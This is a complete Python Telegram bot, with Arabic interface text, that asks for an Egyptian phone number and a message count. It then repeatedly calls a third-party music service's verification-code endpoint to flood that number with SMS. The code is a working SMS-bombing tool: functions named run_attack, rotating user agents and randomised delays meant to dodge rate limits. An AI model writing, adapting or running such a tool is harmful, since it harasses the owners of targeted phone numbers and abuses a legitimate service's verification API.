import logging
import asyncio
import random
import string
import requests
import time
import os

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# التوكن من متغير بيئة
TOKEN = os.getenv("BOT_TOKEN")

# إعدادات عامة
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

GET_NUMBER, GET_COUNT = range(2)
API_URL = "https://api.twistmena.com/music/Dlogin/sendCode"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }

def run_attack_sync(number, sms_count):
    success_count = 0
    failure_count = 0
    for i in range(sms_count):
        payload = {"dial": number, "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=6))}
        headers = get_random_headers()
        try:
            response = requests.post(API_URL, headers=headers, json=payload, timeout=15)
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
        except Exception as e:
            failure_count += 1
        time.sleep(random.uniform(1.0, 2.5))
    return success_count, failure_count

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = "أهلاً بك! 🚀\n\nلبدء إرسال الرسائل، استخدم الأمر: /sms"
    await update.message.reply_text(welcome_text)

async def start_sms_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("📞 أرسل لي رقم الهاتف (11 رقمًا يبدأ بـ 01).")
    return GET_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    number = update.message.text
    if number.startswith("01") and len(number) == 11:
        context.user_data['phone_number'] = "2" + number
        await update.message.reply_text("🔢 ممتاز. الآن أرسل عدد الرسائل (رقم بين 1 و 100).")
        return GET_COUNT
    else:
        await update.message.reply_text("❌ رقم غير صحيح. أرسل رقمًا مصريًا صحيحًا.")
        return GET_NUMBER

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    number = context.user_data.get('phone_number')
    sms_count = context.user_data.get('sms_count')

    await context.bot.send_message(chat_id, text=f"🚀 جاري إرسال {sms_count} رسالة إلى {number}...")

    loop = asyncio.get_running_loop()
    success_count, failure_count = await loop.run_in_executor(None, run_attack_sync, number, sms_count)

    summary_text = f"📊 تم الانتهاء:\n- ✅ نجاح: `{success_count}`\n- ❌ فشل: `{failure_count}`"
    await context.bot.send_message(chat_id, text=summary_text, parse_mode='Markdown')

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        sms_count = int(update.message.text)
        if not (1 <= sms_count <= 100):
            await update.message.reply_text("❌ العدد غير مسموح به. أدخل رقمًا بين 1 و 100.")
            return GET_COUNT
        context.user_data['sms_count'] = sms_count
        await run_attack(update, context)
        return ConversationHandler.END
    except (ValueError, TypeError):
        await update.message.reply_text("❌ هذا ليس رقمًا صحيحًا.")
        return GET_COUNT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("👍 تم إلغاء العملية.")
    return ConversationHandler.END

def main() -> None:
    if not TOKEN:
        raise ValueError("❌ BOT_TOKEN غير معرف في متغيرات البيئة.")
    application = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("sms", start_sms_command)],
        states={
            GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            GET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(conv_handler)
    print("🚀 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
